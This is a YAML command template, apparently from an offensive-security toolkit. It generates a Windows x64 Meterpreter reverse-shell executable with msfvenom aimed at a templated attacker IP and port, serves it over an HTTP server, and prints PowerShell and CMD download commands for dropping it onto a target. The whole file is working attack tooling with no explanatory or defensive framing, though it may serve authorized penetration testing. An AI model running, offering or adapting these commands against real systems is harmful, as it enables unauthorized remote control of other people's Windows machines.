---
metadata:
  filename: "deliver-windows-x64-revshell-msfvenom-meterpreter-nonstaged-exe.yaml"
  tags: ["shell", "windows"]
  created: "2025-03-29"
  author: "Unknown"

content: |
  mkdir -p packstation/outbound; echo 'msfvenom creates the payload. Please wait...'; \
  msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} -f exe > packstation/outbound/revshell.exe ; \
  echo '================================================================'; \
  echo '                      ------Listener------                      '; \
  echo 'Start listener: {{ include('scripts/listener-msf-multi-handler-windows-x64-meterpreter-nonstaged.yaml') }}'; \
  echo '================================================================'; \
  echo '                      -----PowerShell-----                      '; \
  echo 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
  echo '================================================================'; \
  echo '                         -----CMD-----                          '; \
  echo 'Deliver only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/revshell.exe -Outfile {{ delivery_path_windows }}\revshell.exe'; \
  echo '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
